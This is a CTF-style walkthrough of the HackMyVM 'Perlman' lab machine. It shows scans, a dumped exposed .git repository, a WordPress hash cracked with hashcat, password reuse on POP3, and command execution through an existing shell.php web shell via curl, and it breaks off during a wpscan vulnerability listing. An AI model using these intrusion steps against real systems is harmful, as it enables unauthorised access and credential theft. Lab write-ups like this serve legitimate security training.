---
layout: post
title: "HackMyVM - Perlman"
date: 2022-09-23 15:47:00 +0100
categories: hmv
tag: ["GIT", "SMTP", "WordPress", "RCE", "LFI", "LogPoison"]
---

Creator:  [cromiphi](https://hackmyvm.eu/profile/?user=cromiphi)
Level: Hard
Release Date: 2022-09-15

## Scan & Enumeration

```
$ nmap -sC -sV -oA nmap/Perlman -p- 192.168.1.11
```

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2022-09-23 06:24 WET
Nmap scan report for 192.168.1.11
Host is up (0.00039s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0f47dad5d2a25ec17b562b02ea58d4f (RSA)
|   256 f1d801079fd78d2edaa49f36a2ff2adf (ECDSA)
|_  256 91022933c5ff2dd863b847f3f3d879ac (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: perlman.hmv, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| ssl-cert: Subject: commonName=perlman
| Subject Alternative Name: DNS:perlman
| Not valid before: 2022-07-02T10:12:39
|_Not valid after:  2032-06-29T10:12:39
80/tcp  open  http     Apache httpd 2.4.54 ((Debian))
|_http-title: Sync - Mobile App Landing Page HTML Template
| http-git: 
|   192.168.1.11:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: wp 
|_http-server-header: Apache/2.4.54 (Debian)
110/tcp open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: TOP CAPA PIPELINING STLS AUTH-RESP-CODE USER UIDL RESP-CODES SASL(PLAIN)
| ssl-cert: Subject: commonName=perlman
| Subject Alternative Name: DNS:perlman
| Not valid before: 2022-07-02T10:12:39
|_Not valid after:  2032-06-29T10:12:39
119/tcp open  nntp     InterNetNews (INN) 2.6.4
995/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: PIPELINING RESP-CODES AUTH-RESP-CODE TOP USER UIDL CAPA SASL(PLAIN)
| ssl-cert: Subject: commonName=perlman
| Subject Alternative Name: DNS:perlman
| Not valid before: 2022-07-02T10:12:39
|_Not valid after:  2032-06-29T10:12:39
|_ssl-date: TLS randomness does not represent time
Service Info: Hosts:  perlman.hmv, server.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.01 seconds
```

* SubDomain :  perlman.hmv

### Gobuster

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://perlman.hmv -x php,txt,html -o medium-dev-files.log
```

```bash
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://perlman.hmv
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2022/09/23 06:29:42 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/images               (Status: 301) [Size: 311] [--> http://perlman.hmv/images/]
/index.html           (Status: 200) [Size: 47426]
/.html                (Status: 403) [Size: 276]
/css                  (Status: 301) [Size: 308] [--> http://perlman.hmv/css/]
/privacy-policy.html  (Status: 200) [Size: 25624]
/js                   (Status: 301) [Size: 307] [--> http://perlman.hmv/js/]
/terms-conditions.html (Status: 200) [Size: 18494]
/.php                 (Status: 403) [Size: 276]
/.html                (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 276]
Progress: 880594 / 882244 (99.81%)
===============================================================
2022/09/23 06:34:07 Finished
===============================================================
```

## Recon

### NNTP Recon

```
$ nc -v perlman.hmv 119
```

```smtp
perlman.hmv [192.168.1.11] 119 (nntp) open
200 server.example.net InterNetNews NNRP server INN 2.6.4 ready (posting ok)
HELP
100 Legal commands
  ARTICLE [message-ID|number]
  AUTHINFO USER name|PASS password|SASL mechanism [initial-response]|GENERIC program [argument ...]
  BODY [message-ID|number]
  CAPABILITIES [keyword]
  COMPRESS DEFLATE
  DATE
  GROUP newsgroup
  HDR header [message-ID|range]
  HEAD [message-ID|number]
  HELP
  IHAVE message-ID
  LAST
  LIST [ACTIVE [wildmat]|ACTIVE.TIMES [wildmat]|COUNTS [wildmat]|DISTRIB.PATS|DISTRIBUTIONS|HEADERS [MSGID|RANGE]|MODERATORS|MOTD|NEWSGROUPS [wildmat]|OVERVIEW.FMT|SUBSCRIPTIONS [wildmat]]
  LISTGROUP [newsgroup [range]]
  MODE READER
  NEWGROUPS [yy]yymmdd hhmmss [GMT]
  NEWNEWS wildmat [yy]yymmdd hhmmss [GMT]
  NEXT
  OVER [range]
  POST
  QUIT
  STARTTLS
  STAT [message-ID|number]
  XGTITLE [wildmat]
  XHDR header [message-ID|range]
  XOVER [range]
  XPAT header message-ID|range pattern [pattern ...]
Report problems to <usenet@perlman.hmv>.
.

LIST
215 Newsgroups in form "group high low status"
control 0000000000 0000000001 n
control.cancel 0000000000 0000000001 n
control.checkgroups 0000000000 0000000001 n
control.newgroup 0000000000 0000000001 n
control.rmgroup 0000000000 0000000001 n
junk 0000000000 0000000001 n
local.general 0000000000 0000000001 y
local.test 0000000000 0000000001 y
perlman.hmv 0000000002 0000000001 y
.

GROUP perlman.hmv
211 1 1 2 perlman.hmv

ARTICLE 2
220 2 <tfi784$403$1@perlman.hmv> article
Path: server.example.net!.POSTED.192.168.0.27!not-for-mail
From: rita <rita@perlman.hmv>
Newsgroups: perlman.hmv
Subject: Whats up ?!
Date: Sat, 10 Sep 2022 14:33:40 -0000 (UTC)
Organization: A poorly-installed InterNetNews site
Message-ID: <tfi784$403$1@perlman.hmv>
Mime-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
Injection-Date: Sat, 10 Sep 2022 14:33:40 -0000 (UTC)
Injection-Info: perlman.hmv; posting-host="192.168.0.27";
        logging-data="4099"; mail-complaints-to="usenet@perlman.hmv"
User-Agent: Pan/0.151 (Butcha; a6f6327)
Xref: server.example.net perlman.hmv:2

So cool to have installed a newsgroup server! 
See you soon kissss
.
```

* Username : rita

### GIT

```bash
$ python3 gitfinder.py -i input.txt
```

```bash
###########
# Finder is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances.
# Only for educational purposes!
###########

Scanning...
[*] Found: perlman.hmv
Finished
```

```bash
$ ./gitdumper.sh http://perlman.hmv/.git/ .
```

```bash
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating ./.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/40/f3ff4215a1102c35447533676797ec06f8ffd9
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/d2/9e54424558256922c83396a320ff7fec2a81dc
[+] Downloaded: objects/0c/f1c46eefb7c5ebaf8d066e0b5cd730d7c8c58f
[+] Downloaded: objects/70/8220d31a540e356d8fd63fa1cc3d066199109a
[+] Downloaded: objects/df/304da7158234a923bb717fc72be3c20e2864b3
[+] Downloaded: objects/ad/422b39a4cdc8b5541a34c73756fe9c7ea87341
[+] Downloaded: objects/fb/435af2cb9880a1b016c9d268a772587f15b01f
[+] Downloaded: objects/03/9117dcf7eb7728a1e743d8b88ae88ed9f5f1cf
[+] Downloaded: objects/46/2a3534e258daf09a0d2d9f324674c913dcbe31
[+] Downloaded: objects/90/fc1a09cda9208e4d85cb62f0017cd3ebaf54e8
[+] Downloaded: objects/d5/16536b94baeafb5ee6396a9d8b915a2ca5d399
[+] Downloaded: objects/f6/cec0bc7daea37ac9e9c488d16a982d5f5b2c6d
[+] Downloaded: objects/78/d1e9f6d53308ac6604cea994700c6df88da6f4
[+] Downloaded: objects/8b/0d7de5c057dce3ab17d99e7766008c783bc287
[+] Downloaded: objects/81/ecb6e0365bb60b6324d7b90f17df3fe949ccab
[+] Downloaded: objects/ad/3f4525e7ceaba5e7af542d1dfd0ef6abb6b0a0
[+] Downloaded: objects/15/8c826eec8513cc3eb8f9b9cfece64b73ecb256
[+] Downloaded: objects/00/933018b10d9015482170a1b4b11611407334ba
[+] Downloaded: objects/8a/5646ddca34e046cc2f172d98ce29d00ea39b63
[+] Downloaded: objects/d0/1f63dba38e3e1d317502ec1d3cc6dd2d32cc7b
[+] Downloaded: objects/14/424894c70ea1e64d3caf3bf7d24146a5a7b62d
[+] Downloaded: objects/1b/6cc566a580516af2ae08b0e18cc30b7257d85c
[+] Downloaded: objects/43/89ca985f8f6a8381bdeed57b0f678862b9c358
[+] Downloaded: objects/03/d2ecd9e468cf069c51600ecbe13cf48136abe5
[+] Downloaded: objects/7e/4c0667750620966b07dd4f3548cf04a43d9ffc
[+] Downloaded: objects/14/5d3f7b92190c61bc700e06cac301867c912ead
[+] Downloaded: objects/a7/4a3ab9c8047c8b96522ccc9554f2d8d9d7c37b
[+] Downloaded: objects/7c/c33f9ce2b2b70d6ee3e4ca77db0305ba5b58a7
[+] Downloaded: objects/02/2e935047123ce265a42a7d58a9e4d4fb8d59c9
[+] Downloaded: objects/87/057e525b9791571806e63244bcf7c710d56ac0
[+] Downloaded: objects/7f/e7dd389a3e63bb67ed90853c58a97c5a89d66c
[+] Downloaded: objects/57/2f66c0aa68b1bbca2e73f6fc47b6dcf63d8d72
[+] Downloaded: objects/11/c0725279f8dedf58b47412ba9faa5f6282c46a
[-] Downloaded: objects/25/5d4073889f291767d7f6bffdf71ab0a752199f
[-] Downloaded: objects/e1/054a22669c3db78b457712d28000fbe3c277ec

$ ls -la
total 44
drwxr-xr-x  6 adok adok 4096 Mar  9 06:45 .
drwxr-xr-x  3 adok adok 4096 Mar  9 06:45 ..
-rw-r--r--  1 adok adok    3 Mar  9 06:45 COMMIT_EDITMSG
-rw-r--r--  1 adok adok   92 Mar  9 06:45 config
-rw-r--r--  1 adok adok   73 Mar  9 06:45 description
-rw-r--r--  1 adok adok   23 Mar  9 06:45 HEAD
-rw-r--r--  1 adok adok 2133 Mar  9 06:45 index
drwxr-xr-x  2 adok adok 4096 Mar  9 06:45 info
drwxr-xr-x  3 adok adok 4096 Mar  9 06:45 logs
drwxr-xr-x 35 adok adok 4096 Mar  9 06:45 objects
drwxr-xr-x  5 adok adok 4096 Mar  9 06:45 refs
```

* GIT information 

```bash
$ git status
```

```bash
On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        deleted:    commentmeta.sql
        deleted:    comments.sql
        deleted:    db/index.php
        deleted:    links.sql
        deleted:    options.sql
        deleted:    postmeta.sql
        deleted:    posts.sql
        deleted:    tcp_addresses.sql
        deleted:    tcp_countries.sql
        deleted:    tcp_currencies.sql
        deleted:    tcp_orders.sql
        deleted:    tcp_orders_costs.sql
        deleted:    tcp_orders_costsmeta.sql
        deleted:    tcp_orders_details.sql
        deleted:    tcp_orders_detailsmeta.sql
        deleted:    tcp_ordersmeta.sql
        deleted:    tcp_rel_entities.sql
        deleted:    tcp_tax_rates.sql
        deleted:    tcp_taxes.sql
        deleted:    term_relationships.sql
        deleted:    term_taxonomy.sql
        deleted:    termmeta.sql
        deleted:    terms.sql
        deleted:    usermeta.sql
        deleted:    users.sql

Untracked files:
  (use "git add <file>..." to include in what will be committed)
        README.md
        gitdumper.sh

no changes added to commit (use "git add" and/or "git commit -a")
```

* GIT recover deleted files

```
$ git reset --hard
```

```bash
HEAD is now at 40f3ff4 wp

$ ls -la                      
total 1224
drwxr-xr-x 4 adok adok    4096 Sep  9 07:26 .
drwxr-xr-x 7 adok adok    4096 Sep  9 06:41 ..
-rw-r--r-- 1 adok adok    2144 Sep  9 07:26 commentmeta.sql
-rw-r--r-- 1 adok adok    3538 Sep  9 07:26 comments.sql
drwxr-xr-x 2 adok adok    4096 Sep  9 07:26 db
drwxr-xr-x 6 adok adok    4096 Sep  9 07:26 .git
-rwxr-xr-x 1 adok adok    4389 Sep  9 06:41 gitdumper.sh
-rw-r--r-- 1 adok adok    2720 Sep  9 07:26 links.sql
-rw-r--r-- 1 adok adok 1082657 Sep  9 07:26 options.sql
-rw-r--r-- 1 adok adok    2502 Sep  9 07:26 postmeta.sql
-rw-r--r-- 1 adok adok   13542 Sep  9 07:26 posts.sql
-rw-r--r-- 1 adok adok     416 Sep  9 06:41 README.md
-rw-r--r-- 1 adok adok    2713 Sep  9 07:26 tcp_addresses.sql
-rw-r--r-- 1 adok adok   24292 Sep  9 07:26 tcp_countries.sql
-rw-r--r-- 1 adok adok   11572 Sep  9 07:26 tcp_currencies.sql
-rw-r--r-- 1 adok adok    2051 Sep  9 07:26 tcp_orders_costsmeta.sql
-rw-r--r-- 1 adok adok    2121 Sep  9 07:26 tcp_orders_costs.sql
-rw-r--r-- 1 adok adok    2067 Sep  9 07:26 tcp_orders_detailsmeta.sql
-rw-r--r-- 1 adok adok    2633 Sep  9 07:26 tcp_orders_details.sql
-rw-r--r-- 1 adok adok    2003 Sep  9 07:26 tcp_ordersmeta.sql
-rw-r--r-- 1 adok adok    4133 Sep  9 07:26 tcp_orders.sql
-rw-r--r-- 1 adok adok    2055 Sep  9 07:26 tcp_rel_entities.sql
-rw-r--r-- 1 adok adok    1905 Sep  9 07:26 tcp_taxes.sql
-rw-r--r-- 1 adok adok    2196 Sep  9 07:26 tcp_tax_rates.sql
-rw-r--r-- 1 adok adok    2114 Sep  9 07:26 termmeta.sql
-rw-r--r-- 1 adok adok    2162 Sep  9 07:26 term_relationships.sql
-rw-r--r-- 1 adok adok    2247 Sep  9 07:26 terms.sql
-rw-r--r-- 1 adok adok    2446 Sep  9 07:26 term_taxonomy.sql
-rw-r--r-- 1 adok adok    3943 Sep  9 07:26 usermeta.sql
-rw-r--r-- 1 adok adok    2763 Sep  9 07:26 users.sql
```

* List commits

```
$ git log --oneline 
```

```bash
40f3ff4 (HEAD -> master) wp
0cf1c46 config
d29e544 perlman
```

* Show changes

```bash
$ git diff 0cf1c46 d29e544
```

```bash
diff --git a/users.sql b/users.sql
index 7fe7dd3..572f66c 100644
--- a/users.sql
+++ b/users.sql
@@ -46,7 +46,7 @@ CREATE TABLE `users` (
 
 LOCK TABLES `users` WRITE;
 /*!40000 ALTER TABLE `users` DISABLE KEYS */;
-INSERT INTO `users` VALUES (1,'webmaster','','webmaster','webmaster@perlman.hmv','http://perlman.hmv','2022-07-03 16:23:02','',0,'webmaster');
+INSERT INTO `users` VALUES (1,'webmaster','$P$BCaMhRZQp/mi0nyIVVPS6u1EU8sTCR/','webmaster','webmaster@perlman.hmv','http://perlman.hmv','2022-07-03 16:23:02','',0,'webmaster');
 /*!40000 ALTER TABLE `users` ENABLE KEYS */;
 UNLOCK TABLES;
 /*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
 ```

### Crack webmaster (HASHCAT)

```
$ hashcat hash -a 0 /usr/share/wordlists/rockyou.txt
```

```bash
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i3-3110M CPU @ 2.40GHz, 2855/5774 MB (1024 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

400 | phpass | Generic KDF

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

$P$BCaMhRZQp/mi0nyIVVPS6u1EU8sTCR/:cookie                 
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 400 (phpass)
Hash.Target......: $P$BCaMhRZQp/mi0nyIVVPS6u1EU8sTCR/
Time.Started.....: Thu Sep 23 07:33:25 2022 (1 sec)
Time.Estimated...: Thu Sep 23 07:33:26 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      296 H/s (6.92ms) @ Accel:64 Loops:512 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 256/14344385 (0.00%)
Rejected.........: 0/256 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:7680-8192
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> freedom
Hardware.Mon.#1..: Temp: 55c Util: 82%

Started: Thu Sep 23 07:32:12 2022
Stopped: Thu Sep 23 07:33:28 2022
```

* Credentials : webmaster : cookie

## Exploitation

### Email (RITA)

```bash
$ nc -v perlman.hmv 25
perlman.hmv [192.168.1.11] 25 (smtp) open
220 perlman.hmv ESMTP Postfix (Debian/GNU)
EHLO perlman.hmv
VRFY rita
MAIL FROM:<rita>
RCPT TO:non_existent_user0123456789@gmail.com
data
Hello
.250-perlman.hmv
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING
252 2.0.0 rita
250 2.1.0 Ok
250 2.1.5 Ok
354 End data with <CR><LF>.<CR><LF>

250 2.0.0 Ok: queued as 6222140BFB
quit
221 2.0.0 Bye
```

### Read response

```bash
$ nc -v perlman.hmv 110
perlman.hmv [192.168.1.11] 110 (pop3) open
+OK Dovecot (Debian) ready.
USER rita
+OK
PASS cookie
+OK Logged in.
LIST
+OK 1 messages:
1 3211
.
RETR 1
+OK 3211 octets
Return-Path: <>
X-Original-To: rita@perlman.hmv
Delivered-To: rita@perlman.hmv
Received: by perlman.hmv (Postfix)
        id 5703640C1F; Thu, 23 Sep 2022 08:56:29 +0100 (CET)
Date: Thu, 23 Sep 2022 08:56:29 +0100 (CET)
From: MAILER-DAEMON@perlman.hmv (Mail Delivery System)
Subject: Undelivered Mail Returned to Sender
To: rita@perlman.hmv
Auto-Submitted: auto-replied
MIME-Version: 1.0
Content-Type: multipart/report; report-type=delivery-status;
        boundary="6222140BFB.1678348589/perlman.hmv"
Content-Transfer-Encoding: 8bit
Message-Id: <20230309075629.5703640C1F@perlman.hmv>

This is a MIME-encapsulated message.

--6222140BFB.1678348589/perlman.hmv
Content-Description: Notification
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: 8bit

           Charset: us-ascii
           From: MAILER-DAEMON (mailer@itzhak.perlman.hmv)
           Subject: Undelivered Mail Returned to Sender
           Postmaster-Subject: Postmaster Copy: Undelivered Mail
              

           This is the mail system at host perlman.hmv.

           I'm sorry to have to inform you that your message could not
           be delivered to one or more recipients. It's attached below.

           For further assistance, please send mail to postmaster.

           If you do so, please include this problem report. You can
           delete your own text from the attached returned message.

                              The mail system
           EOF

<non_existent_user0123456789@gmail.com>: host
    gmail-smtp-in.l.google.com[64.233.166.27] said: 550-5.1.1 The email account
    that you tried to reach does not exist. Please try 550-5.1.1
    double-checking the recipient's email address for typos or 550-5.1.1
    unnecessary spaces. Learn more at 550 5.1.1
    https://support.google.com/mail/?p=NoSuchUser
    h13-20020a5d688d000000b002c5532bd6dasi13577043wru.98 - gsmtp (in reply to
    RCPT TO command)

--6222140BFB.1678348589/perlman.hmv
Content-Description: Delivery report
Content-Type: message/delivery-status

Reporting-MTA: dns; perlman.hmv
X-Postfix-Queue-ID: 6222140BFB
X-Postfix-Sender: rfc822; rita@perlman.hmv
Arrival-Date: Thu, 23 Sep 2022 08:56:10 +0100 (CET)

Final-Recipient: rfc822; non_existent_user0123456789@gmail.com
Original-Recipient: rfc822;non_existent_user0123456789@gmail.com
Action: failed
Status: 5.1.1
Remote-MTA: dns; gmail-smtp-in.l.google.com
Diagnostic-Code: smtp; 550-5.1.1 The email account that you tried to reach does
    not exist. Please try 550-5.1.1 double-checking the recipient's email
    address for typos or 550-5.1.1 unnecessary spaces. Learn more at 550 5.1.1
    https://support.google.com/mail/?p=NoSuchUser
    h13-20020a5d688d000000b002c5532bd6dasi13577043wru.98 - gsmtp

--6222140BFB.1678348589/perlman.hmv
Content-Description: Undelivered Message
Content-Type: message/rfc822
Content-Transfer-Encoding: 8bit

Return-Path: <rita@perlman.hmv>
Received: from perlman.hmv (unknown [192.168.1.6])
        by perlman.hmv (Postfix) with ESMTP id 6222140BFB
        for <non_existent_user0123456789@gmail.com>; Thu, 23 Sep 2022 08:56:10 +0100 (CET)

Hello

--6222140BFB.1678348589/perlman.hmv--
.
quit
+OK Logging out.
```

* SubDomain : itzhak.perlman.hmv

## Wordpress

### Gobuster (itzhak.perlman.hmv)

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://itzhak.perlman.hmv -x php,txt,html -o itzhak.perlman.hmv-medium-dev-files.log
```

```bash
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://itzhak.perlman.hmv
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
2022/09/23 08:02:04 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 283]
/.php                 (Status: 403) [Size: 283]
/wp-content           (Status: 301) [Size: 329] [--> http://itzhak.perlman.hmv/wp-content/]
/index.php            (Status: 301) [Size: 0] [--> http://itzhak.perlman.hmv/]
/license.txt          (Status: 200) [Size: 19915]
/wp-login.php         (Status: 302) [Size: 0] [--> http://itzhak.perlman.hmv/?page_id=9]
/wp-includes          (Status: 301) [Size: 330] [--> http://itzhak.perlman.hmv/wp-includes/]
/shell.php            (Status: 200) [Size: 0]
/readme.html          (Status: 200) [Size: 7401]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp-admin             (Status: 301) [Size: 327] [--> http://itzhak.perlman.hmv/wp-admin/]
/.php                 (Status: 403) [Size: 283]
/.html                (Status: 403) [Size: 283]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://itzhak.perlman.hmv/wp-login.php?action=register]
/server-status        (Status: 403) [Size: 283]
Progress: 882159 / 882244 (99.99%)
===============================================================
2022/09/23 08:06:54 Finished
===============================================================
```

### RCE

```bash
$ curl http://itzhak.perlman.hmv/shell.php?cmd=id             
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### WPSCAN

```bash
$ wpscan --url http://itzhak.perlman.hmv/ -e vt,vp --api-token    
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://itzhak.perlman.hmv/ [192.168.1.11]
[+] Started: Thu Sep 23 08:49:47 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.54 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://itzhak.perlman.hmv/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://itzhak.perlman.hmv/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://itzhak.perlman.hmv/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://itzhak.perlman.hmv/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.0.2 identified (Insecure, released on 2022-08-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://itzhak.perlman.hmv/?feed=rss2, <generator>https://wordpress.org/?v=6.0.2</generator>
 |  - http://itzhak.perlman.hmv/?feed=comments-rss2, <generator>https://wordpress.org/?v=6.0.2</generator>
 |
 | [!] 13 vulnerabilities identified:
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via wp-mail.php
 |     Fixed in: 6.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/713bdc8b-ab7c-46d7-9847-305344a579c4
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/abf236fdaf94455e7bc6e30980cf70401003e283
 |
 | [!] Title: WP < 6.0.3 - Open Redirect via wp_nonce_ays
 |     Fixed in: 6.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/926cd097-b36f-4d26-9c51-0dfab11c301b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/506eee125953deb658307bb3005417cb83f32095
 |
 | [!] Title: WP < 6.0.3 - Email Address Disclosure via wp-mail.php
 |     Fixed in: 6.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/c5675b59-4b1d-4f64-9876-068e05145431
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/5fcdee1b4d72f1150b7b762ef5fb39ab288c8d44
 |
 | [!] Title: WP < 6.0.3 - Reflected XSS via SQLi in Media Library
 |     Fixed in: 6.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/cfd8b50d-16aa-4319-9c2d-b227365c2156
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/8836d4682264e8030067e07f2f953a0f66cb76cc
 |
 | [!] Title: WP < 6.0.3 - CSRF in wp-trackback.php
 |     Fixed in: 6.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/b60a6557-ae78-465c-95bc-a78cf74a6dd0
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/a4f9ca17fae0b7d97ff807a3c234cf219810fae0
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via the Customizer
 |     Fixed in: 6.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/2787684c-aaef-4171-95b4-ee5048c74218
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/2ca28e49fc489a9bb3c9c9c0d8907a033fe056ef
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via Comment Editing
 |     Fixed in: 6.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/02d76d8e-9558-41a5-bdb6-3957dc31563b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/89c8f7919460c31c0f259453b4ffb63fde9fa955
 |
 | [!] Title: WP < 6.0.3 - Content from Multipart Emails Leaked
 |     Fixed in: 6.0.3
 |     References:
